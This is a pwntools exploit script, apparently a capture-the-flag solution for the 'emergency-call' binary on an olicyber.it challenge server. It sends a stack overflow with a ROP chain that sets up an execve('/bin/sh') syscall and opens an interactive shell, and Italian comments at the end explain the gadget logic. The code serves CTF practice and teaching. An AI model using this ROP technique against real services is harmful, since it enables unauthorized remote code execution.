#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template emergency-call '--host=emergency.challs.olicyber.it' '--port=10306'
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'emergency-call')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'emergency.challs.olicyber.it'
port = int(args.PORT or 10306)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *0x4010db
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      No RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)

BIN_SH = 0x404000
POP_RDI_RET = 0x401032
SYSCALL = 0x40101a
XOR_RAX_RDI_RET = 0x401038
POP_RDX_RET = 0x401036
POP_RSI_RET = 0x401034

io = start()

io.sendafter(b"> ", b"/bin/sh")

payload = flat(
        b"A" * 32,
        b"B" * 8,
        p64(POP_RDI_RET),
        p64(0x3b), 
        p64(XOR_RAX_RDI_RET),
        p64(POP_RDI_RET),
        p64(BIN_SH),
        p64(POP_RDX_RET),
        p64(0x0),
        p64(POP_RSI_RET),
        p64(0x0),
        p64(SYSCALL)
    )

io.sendafter(b"> ", payload)

io.interactive()


# devo riuscire a salvare 59 = 0x3b su RAX
# la syscall READ salva su RAX il numero di bytes letti
# non posso manipolare la read, ma c'è uno xor rax, rdi che noi
# controlliamo quindi possiamo azzerare RAX e poi poppare su RDI un valore 
# che xorato con RAX fa esattamente 0x3b syscall di execv 
# dopo poppiamo /bin/sh su RDI e azzeriamo RSI e RDX e poi chiamiamo syscall